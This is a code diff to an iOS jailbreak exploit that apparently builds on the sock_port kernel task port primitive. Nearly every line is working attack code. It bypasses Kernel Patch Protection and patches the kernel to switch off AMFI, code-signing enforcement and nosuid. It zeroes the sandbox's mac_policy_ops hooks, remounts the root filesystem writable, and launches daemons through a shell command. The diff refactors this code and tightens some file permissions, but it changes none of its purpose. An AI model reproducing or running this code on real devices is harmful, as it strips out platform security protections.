@@ -45,8 +45,10 @@ extern int (*dsystem)(const char *);
 #define KBASE 0xfffffff007004000
 mach_port_t tfp0 = 0;
 
-void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi);
+void kpp(uint64_t kernbase, uint64_t slide);
 void runLaunchDaemons(void);
+
+static tihmstar::offsetfinder64 fi("/System/Library/Caches/com.apple.kernelcaches/kernelcache");
 
 void suspend_all_threads() {
     thread_act_t other_thread, current_thread;
@@ -99,26 +101,25 @@ init_kernel(size_t (*kread)(uint64_t, void *, size_t), kptr_t kernel_base, const
 extern "C" uint64_t find_panic(void);
 
 kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
-    resume_all_threads();
-    LOG("done sock port!\n");
-    tfp0 = tfp0_;
+    postProgress(@"setting hgsp4");
+    int ret1 = init_kernel(kread, kbase, NULL);
+    bool ret2 = init_kexec();
     
-    tihmstar::offsetfinder64 *fi = static_cast<tihmstar::offsetfinder64 *>(data);
+    if(ret1 && !ret2) {
+        postProgress(@"patchfinder64 or kexec failed!");
+        return -1;
+    }
 
+    bool ret3 = set_hgsp4(tfp0, tfp0, kbase);
+    if (!ret3) {
+        postProgress(@"set_hgsp4 failed!");
+        return -1;
+    }
+    term_kexec();
+    
+    resume_all_threads();
     try {
-        int ret1 = init_kernel(kread, kbase, NULL);
-        bool ret2 = init_kexec();
-        
-        if(ret1 && !ret2) {
-            throw tihmstar::exception(0x123, "patchfinder64 or kexec failed!", "");
-        }
-
-        bool ret3 = set_hgsp4(tfp0_, tfp0_, kbase);
-        if (!ret3) {
-            throw tihmstar::exception(0x123, "set_hgsp4 failed!", "");
-        }
-        term_kexec();
-        kpp(kbase,kbase-KBASE,fi);
+        kpp(kbase,kbase-KBASE);
     } catch (tihmstar::exception &e) {
         LOG("Failed jailbreak!: %s [%u]", e.what(), e.code());
         NSString *err = [NSString stringWithFormat:@"Error: %d",e.code()];
@@ -136,30 +137,30 @@ uint64_t physalloc(uint64_t size) {
     return ret;
 }
 
-void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi){
+void kpp(uint64_t kernbase, uint64_t slide){
     postProgress(@"running KPP bypass");
     checkvad();
 
     uint64_t entryp;
 
-    uint64_t gStoreBase = (uint64_t)fi->find_gPhysBase() + slide;
+    uint64_t gStoreBase = (uint64_t)fi.find_gPhysBase() + slide;
 
     gPhysBase = ReadAnywhere64(gStoreBase);
     gVirtBase = ReadAnywhere64(gStoreBase+8);
 
-    entryp = (uint64_t)fi->find_entry() + slide;
+    entryp = (uint64_t)fi.find_entry() + slide;
     uint64_t rvbar = entryp & (~0xFFF);
 
-    uint64_t cpul = fi->find_register_value((tihmstar::patchfinder64::loc_t)rvbar+0x40-slide, 1)+slide;
+    uint64_t cpul = fi.find_register_value((tihmstar::patchfinder64::loc_t)rvbar+0x40-slide, 1)+slide;
 
-    uint64_t optr = fi->find_register_value((tihmstar::patchfinder64::loc_t)rvbar+0x50-slide, 20)+slide;
+    uint64_t optr = fi.find_register_value((tihmstar::patchfinder64::loc_t)rvbar+0x50-slide, 20)+slide;
 
     NSLog(@"%llx", optr);
 
     uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - gPhysBase + gVirtBase;
     uint64_t cpu = ReadAnywhere64(cpu_list);
 
-    uint64_t pmap_store = (uint64_t)fi->find_kernel_pmap() + slide;
+    uint64_t pmap_store = (uint64_t)fi.find_kernel_pmap() + slide;
     NSLog(@"pmap: %llx", pmap_store);
     level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));
 
@@ -249,8 +250,8 @@ void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi){
 
     uint64_t shc = physalloc(0x4000);
 
-    uint64_t regi = fi->find_register_value((tihmstar::patchfinder64::loc_t)idlesleep_handler+12-slide, 30)+slide;
-    uint64_t regd = fi->find_register_value((tihmstar::patchfinder64::loc_t)idlesleep_handler+24-slide, 30)+slide;
+    uint64_t regi = fi.find_register_value((tihmstar::patchfinder64::loc_t)idlesleep_handler+12-slide, 30)+slide;
+    uint64_t regd = fi.find_register_value((tihmstar::patchfinder64::loc_t)idlesleep_handler+24-slide, 30)+slide;
 
     NSLog(@"%llx - %llx", regi, regd);
 
@@ -264,7 +265,7 @@ void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi){
 
     uint64_t level0_pte = physalloc(isvad == 0 ? 0x4000 : 0x1000);
 
-    uint64_t ttbr0_real = fi->find_register_value((tihmstar::patchfinder64::loc_t)(idlesleep_handler-slide + idx*4 + 24), 1)+slide;
+    uint64_t ttbr0_real = fi.find_register_value((tihmstar::patchfinder64::loc_t)(idlesleep_handler-slide + idx*4 + 24), 1)+slide;
 
     NSLog(@"ttbr0: %llx %llx",ReadAnywhere64(ttbr0_real), ttbr0_real);
 
@@ -353,7 +354,7 @@ void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi){
 
      */
 
-    uint64_t cpacr_addr = (uint64_t)fi->find_cpacr_write() + slide;
+    uint64_t cpacr_addr = (uint64_t)fi.find_cpacr_write() + slide;
 #define PSZ (isvad ? 0x1000 : 0x4000)
 #define PMK (PSZ-1)
 
@@ -408,7 +409,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     WriteAnywhere64(ReadAnywhere64(pmap_store), level1_table);
 
 
-    uint64_t shtramp = kernbase + ((const struct mach_header *)fi->kdata())->sizeofcmds + sizeof(struct mach_header_64);
+    uint64_t shtramp = kernbase + ((const struct mach_header *)fi.kdata())->sizeofcmds + sizeof(struct mach_header_64);
     RemapPage(cpacr_addr);
     WriteAnywhere32(NewPointer(cpacr_addr), 0x94000000 | (((shtramp - cpacr_addr)/4) & 0x3FFFFFF));
 
@@ -418,27 +419,27 @@ remappage[remapcnt++] = (x & (~PMK));\
     WriteAnywhere64(NewPointer(shtramp)+8, kppsh);
 
 
-    WriteAnywhere64((uint64_t)fi->find_idlesleep_str_loc()+slide, physcode+0x100);
-    WriteAnywhere64((uint64_t)fi->find_deepsleep_str_loc()+slide, physcode+0x200);
+    WriteAnywhere64((uint64_t)fi.find_idlesleep_str_loc()+slide, physcode+0x100);
+    WriteAnywhere64((uint64_t)fi.find_deepsleep_str_loc()+slide, physcode+0x200);
 
 
     //kernelpatches
     postProgress(@"patching kernel");
 
     std::vector<tihmstar::patchfinder64::patch> kernelpatches;
-    kernelpatches.push_back(fi->find_i_can_has_debugger_patch_off());
+    kernelpatches.push_back(fi.find_i_can_has_debugger_patch_off());
 
-    std::vector<tihmstar::patchfinder64::patch> nosuid = fi->find_nosuid_off();
+    std::vector<tihmstar::patchfinder64::patch> nosuid = fi.find_nosuid_off();
 
-    kernelpatches.push_back(fi->find_remount_patch_offset());
-    kernelpatches.push_back(fi->find_lwvm_patch_offsets());
+    kernelpatches.push_back(fi.find_remount_patch_offset());
+    kernelpatches.push_back(fi.find_lwvm_patch_offsets());
     kernelpatches.push_back(nosuid.at(0));
     kernelpatches.push_back(nosuid.at(1));
-    kernelpatches.push_back(fi->find_proc_enforce());
-    kernelpatches.push_back(fi->find_amfi_patch_offsets());
-    kernelpatches.push_back(fi->find_cs_enforcement_disable_amfi());
-    kernelpatches.push_back(fi->find_amfi_substrate_patch());
-    kernelpatches.push_back(fi->find_nonceEnabler_patch());
+    kernelpatches.push_back(fi.find_proc_enforce());
+    kernelpatches.push_back(fi.find_amfi_patch_offsets());
+    kernelpatches.push_back(fi.find_cs_enforcement_disable_amfi());
+    kernelpatches.push_back(fi.find_amfi_substrate_patch());
+    kernelpatches.push_back(fi.find_nonceEnabler_patch());
 
     try {
         //kernelpatches.push_back(fi->find_sandbox_patch());
@@ -474,7 +475,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     }
 
     postProgress(@"patching sandbox");
-    uint64_t sbops = (uint64_t)fi->find_sbops()+slide;
+    uint64_t sbops = (uint64_t)fi.find_sbops()+slide;
     uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops) + PMK;
 
     uint64_t nopag = (sbops_end - sbops)/(PSZ);
@@ -483,43 +484,54 @@ remappage[remapcnt++] = (x & (~PMK));\
         RemapPage(((sbops + i*(PSZ)) & (~PMK)));
     }
 
-    printf("Found sbops 0x%llx\n",sbops);
-
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
-
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_get_property)), 0);
-
-    uint64_t marijuanoff = (uint64_t)fi->memmem("RELEASE_ARM",sizeof("RELEASE_ARM")-1)+slide;
+    NSLog(@"Found sbops 0x%llx size: %lld\n", sbops, sbops_end - sbops);
+    
+    struct mac_policy_ops *ops = (struct mac_policy_ops *)malloc(sizeof(struct mac_policy_ops));
+    if (ops == NULL) {
+        postProgress(@"Error malloc mac_policy");
+        printf("Error malloc mac_policy\n");
+        return;
+    }
+    
+    kread(sbops, (void*)ops, sizeof(*ops));
+    
+    ops->mpo_file_check_mmap = 0;
+    ops->mpo_vnode_check_rename = 0;
+    ops->mpo_vnode_check_access = 0;
+    ops->mpo_vnode_check_chroot = 0;
+    ops->mpo_vnode_check_create = 0;
+    ops->mpo_vnode_check_deleteextattr = 0;
+    ops->mpo_vnode_check_exchangedata = 0;
+    ops->mpo_vnode_check_exec = 0;
+    ops->mpo_vnode_check_getattrlist = 0;
+    ops->mpo_vnode_check_getextattr = 0;
+    ops->mpo_vnode_check_ioctl = 0;
+    ops->mpo_vnode_check_link = 0;
+    ops->mpo_vnode_check_listextattr = 0;
+    ops->mpo_vnode_check_open = 0;
+    ops->mpo_vnode_check_readlink = 0;
+    ops->mpo_vnode_check_setattrlist = 0;
+    ops->mpo_vnode_check_setextattr = 0;
+    ops->mpo_vnode_check_setflags = 0;
+    ops->mpo_vnode_check_setmode = 0;
+    ops->mpo_vnode_check_setowner = 0;
+    ops->mpo_vnode_check_setutimes = 0;
+    ops->mpo_vnode_check_setutimes = 0;
+    ops->mpo_vnode_check_stat = 0;
+    ops->mpo_vnode_check_truncate = 0;
+    ops->mpo_vnode_check_unlink = 0;
+    ops->mpo_vnode_notify_create = 0;
+    ops->mpo_vnode_check_fsgetpath = 0;
+    ops->mpo_vnode_check_getattr = 0;
+    ops->mpo_mount_check_stat = 0;
+    ops->mpo_proc_check_fork = 0;
+    ops->mpo_iokit_check_get_property = 0;
+    
+    kwrite(NewPointer(sbops), (void*)ops, sizeof(*ops));
+    free(ops);
+    ops = NULL;
+    
+    uint64_t marijuanoff = (uint64_t)fi.find_release_arm()+slide;
 
     // smoke trees
     RemapPage(marijuanoff);
@@ -534,22 +546,26 @@ remappage[remapcnt++] = (x & (~PMK));\
         sleep(1);
     }
     
+    postProgress(@"remounting rootfs");
+    
     struct statfs output;
     statfs("/", &output);
-    
 
     char* nm = strdup("/dev/disk0s1s1");
     //int mntr = mount("hfs", "/", 0x10000, &nm);
     //int mntr = mount("apfs", "/", 0x10000, &nm);
     int mntr = mount(output.f_fstypename, "/", 0x10000, &nm);
     printf("Mount succeeded? %d\n",mntr);
-
-    if (open("/v0rtex", O_CREAT | O_RDWR, 0644)>=0){
-        printf("write test success!\n");
-        remove("/v0rtex");
-    }else
-        printf("[!] write test failed!\n");
-
+    if (mntr != 0) {
+        int fd;
+        if ((fd = open("/v0rtex", O_CREAT | O_RDWR, 0644)) >= 0){
+            printf("write test success!\n");
+            close(fd);
+            remove("/v0rtex");
+        }else {
+            printf("[!] write test failed!\n");
+        }
+    }
 
     NSLog(@"enabled patches");
 }
@@ -578,7 +594,6 @@ static kern_return_t sock_port(offsets_t *off, jailbreak_cb_t callback, void *cb
 static offsets_t *_off = NULL;
 
 static int _jailbreak_with_cb(const jailbreak_cb_t &cb) {
-    tihmstar::offsetfinder64 fi("/System/Library/Caches/com.apple.kernelcaches/kernelcache");
 
     offsets_t *off = NULL;
     try {
@@ -680,13 +695,13 @@ void runLaunchDaemons(void){
     }
 
     NSLog(@"Changing permissions\n");
-    r = chmod("/bin/tar", 0777);
+    r = chmod("/bin/tar", 0755);
     if(r != 0){
         NSLog(@"chmod returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
         return;
     }
 
-    r = chmod("/bin/launchctl", 0777);
+    r = chmod("/bin/launchctl", 0755);
     if(r != 0){
         NSLog(@"chmod returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
         return;
@@ -694,8 +709,8 @@ void runLaunchDaemons(void){
 
     int douicache = 0;
     // Bearded old boostrap
-    NSURL *bootstrapURL = [[NSBundle mainBundle]URLForResource:@"Cydia-10" withExtension:@"tar"];
     if(![[NSFileManager defaultManager]fileExistsAtPath:@"/Applications/Cydia.app/"]){
+        NSURL *bootstrapURL = [[NSBundle mainBundle]URLForResource:@"Cydia-10" withExtension:@"tar"];
         postProgress(@"installing Cydia");
         //NSLog(@"Didn't find Cydia.app (so we'll assume bearded old bootstrap isn't extracted, we will extract it)\n");
         NSLog(@"Extracting Cydia...\n");
@@ -728,11 +743,11 @@ void runLaunchDaemons(void){
         NSLog(@"posix_spawn returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
     }
 
-    chmod("/private", 0777);
-    chmod("/private/var", 0777);
-    chmod("/private/var/mobile", 0755);
-    chmod("/private/var/mobile/Library", 0777);
-    chmod("/private/var/mobile/Library/Preferences", 0777);
+    chmod("/private", 0755);
+    chmod("/private/var", 0755);
+    chmod("/private/var/mobile", 0711);
+    chmod("/private/var/mobile/Library", 0711);
+    chmod("/private/var/mobile/Library/Preferences", 0755);
 
 
     dsystem("echo 'really jailbroken';ls /Library/LaunchDaemons | while read a; do launchctl load /Library/LaunchDaemons/$a; done; ls /etc/rc.d | while read a; do /etc/rc.d/$a; done;");
@@ -774,6 +789,8 @@ static kern_return_t sock_port(offsets_t *off, jailbreak_cb_t callback, void *cb
     if (tfp0 == MACH_PORT_NULL) {
         return -1;
     }
+    LOG("done sock port!\n");
+    ::tfp0 = tfp0;
     
     kptr_t kernel_task_addr;
     kread(kbase + off->kernel_task - off->base, &kernel_task_addr, sizeof(kernel_task_addr));
